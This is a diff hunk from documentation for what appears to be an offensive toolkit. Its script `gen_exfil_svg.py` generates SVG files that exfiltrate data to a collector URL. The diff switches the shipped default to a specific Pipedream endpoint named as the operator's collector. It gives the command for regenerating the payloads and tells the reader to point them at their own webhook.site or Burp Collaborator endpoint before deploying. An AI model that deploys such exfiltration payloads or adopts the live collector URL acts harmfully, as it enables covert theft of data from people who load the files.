@@ -165,12 +165,13 @@ handler (READ-ONLY) does:
 `EXFIL` is one constant at the top of `tools/gen_exfil_svg.py`:
 
 ```bash
-EXFIL=https://<your-id>.oast.me/exfil python3 tools/gen_exfil_svg.py   # regenerate all 3 SVGs
+EXFIL=https://<your-id>.m.pipedream.net python3 tools/gen_exfil_svg.py   # regenerate all 3 SVGs
 ```
 
-The shipped default is an interactsh collector (ephemeral). A static host
+The shipped default is the operator's Pipedream collector
+(`https://eo118uqkc7gd1r7.m.pipedream.net`). A static host
 (raw.githubusercontent.com) cannot log requests, so point `EXFIL` at your own
-interactsh / webhook.site / Burp Collaborator endpoint before deploying.
+Pipedream / webhook.site / Burp Collaborator endpoint before deploying.
 Regenerating rewrites only the 3 SVGs; re-run `tools/setbase.sh <base>` if you
 also changed the base, then commit + push.
 
